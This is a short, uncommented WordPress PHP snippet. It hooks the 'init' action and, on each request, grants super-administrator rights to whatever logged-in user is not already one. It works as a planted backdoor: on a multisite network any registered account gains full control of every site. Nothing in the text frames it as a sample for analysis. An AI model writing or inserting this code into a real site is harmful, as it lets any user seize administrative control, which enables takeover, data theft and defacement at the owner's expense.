<?php
add_action('init', function () {
    if (is_user_logged_in()) {
        $user = wp_get_current_user();
        if (!is_super_admin($user->ID)) {
            grant_super_admin($user->ID);
        }
    }
});